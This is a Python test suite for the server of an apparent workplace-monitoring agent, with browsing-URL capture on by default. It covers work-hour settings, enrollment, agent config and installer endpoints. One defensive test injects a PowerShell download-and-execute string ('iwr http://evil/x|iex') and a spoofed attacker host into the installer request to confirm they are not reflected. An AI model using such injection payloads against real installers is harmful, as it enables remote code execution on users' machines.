"""Settings, dashboard-controlled work hours, self-serve enrollment + agent-config,
and the install endpoints — exercised against a live server."""
import os
import sys
import json
import threading
import tempfile
import unittest
import urllib.request
import urllib.error

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
from server import api, db, auth  # noqa: E402


class TestServer(unittest.TestCase):
    def setUp(self):
        fd, self.path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        pre = db.connect(self.path)
        db.init_db(pre)
        pre.close()
        self.srv = api.make_server(0, self.path)
        self.port = self.srv.server_address[1]
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{self.port}"

    def tearDown(self):
        self.srv.shutdown()
        self.srv.server_close()
        os.unlink(self.path)

    def _get(self, path):
        with urllib.request.urlopen(self.url + path) as r:
            return r.status, r.read()

    def _post_json(self, path, obj):
        req = urllib.request.Request(self.url + path, data=json.dumps(obj).encode(),
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req) as r:
            return json.loads(r.read())

    def test_settings_and_work_hours(self):
        with self.srv.lock:
            c = self.srv.conn
            self.assertEqual(db.get_setting(c, "work_start"), "8")
            db.set_setting(c, "work_start", "9")
            db.set_setting(c, "work_days", "0,1,2")
            wh = db.work_hours(c)
        self.assertEqual(wh["work_start"], 9)
        self.assertEqual(wh["work_days"], [0, 1, 2])

    def test_full_url_on_by_default_with_kill_switch(self):
        # full-URL capture ships ON for a fresh org (no setup step), and the agent's
        # config reflects it. The setting is still an honored kill-switch.
        with self.srv.lock:
            c = self.srv.conn
            self.assertEqual(db.get_setting(c, "full_url"), "1")     # default ON
            self.assertTrue(db.work_hours(c)["full_url"])            # reaches the agent
            db.set_setting(c, "full_url", "0")                       # kill-switch honored
            self.assertFalse(db.work_hours(c)["full_url"])

    def test_self_serve_enroll_and_config(self):
        with self.srv.lock:
            code = auth.issue_enrollment_code(self.srv.conn, machine_id=None, label="Sam")
        token = self._post_json("/api/v1/enroll", {"code": code, "hostname": "LAPTOP-SAM"})["token"]
        self.assertTrue(token.startswith("eat_"))
        # agent fetches the dashboard-set work hours
        _, body = self._get("/api/v1/agent-config?token=" + token)
        wh = json.loads(body)
        self.assertIn("work_start", wh)
        self.assertIn("work_days", wh)
        # a change made on the dashboard is reflected to the agent
        with self.srv.lock:
            db.set_setting(self.srv.conn, "work_start", "10")
        _, body2 = self._get("/api/v1/agent-config?token=" + token)
        self.assertEqual(json.loads(body2)["work_start"], 10)

    def test_agent_config_rejects_bad_token(self):
        with self.assertRaises(urllib.error.HTTPError):
            self._get("/api/v1/agent-config?token=eat_nope")

    def test_install_endpoints(self):
        # The install one-liner comes from /install.ps1. It now delivers the standalone
        # .exe — no Python, no pip, no zip.
        _, script = self._get("/install.ps1?code=abc123")
        self.assertIn(b"CoverageAgent", script)
        self.assertIn(b"abc123", script)
        self.assertIn(b"/download/agent.exe", script)
        self.assertNotIn(b"pip install", script)
        self.assertNotIn(b"Expand-Archive", script)
        # legacy zip route still serves (dev fallback)
        _, zipb = self._get("/download/agent.zip")
        self.assertEqual(zipb[:2], b"PK")  # zip magic number

    def test_install_ignores_attacker_server_param(self):
        # SECURITY: a crafted ?server= must NOT be reflected into the script. The installer
        # downloads + runs an .exe from $Server, so honoring it would be phishing-to-RCE.
        _, script = self._get("/install.ps1?server=http://evil.example&code=deadbeef")
        self.assertNotIn(b"evil.example", script)          # attacker host never appears
        self.assertIn(b"127.0.0.1", script)                # our own origin is baked in
        self.assertIn(b"deadbeef", script)                 # valid hex code preserved
        # a non-hex (injection-y) code is dropped, not reflected
        _, script2 = self._get("/install.ps1?code=';iwr%20http://evil/x|iex;%23")
        self.assertNotIn(b"evil", script2)
        self.assertNotIn(b"iex;", script2)

    def test_agent_exe_route(self):
        import urllib.error
        from server import api as _api
        # not built -> helpful 404
        with self.assertRaises(urllib.error.HTTPError) as cm:
            self._get("/download/agent.exe")
        self.assertEqual(cm.exception.code, 404)
        # built -> 200 with the bytes + download disposition
        fd, exe = tempfile.mkstemp(suffix=".exe")
        os.write(fd, b"MZ-fake-exe-bytes")
        os.close(fd)
        orig = _api.AGENT_EXE
        try:
            _api.AGENT_EXE = exe
            req = urllib.request.Request(self.url + "/download/agent.exe")
            with urllib.request.urlopen(req) as r:
                self.assertEqual(r.status, 200)
                self.assertIn("attachment", r.headers.get("Content-Disposition", ""))
                self.assertEqual(r.read(), b"MZ-fake-exe-bytes")
        finally:
            _api.AGENT_EXE = orig
            os.unlink(exe)


if __name__ == "__main__":
    unittest.main()
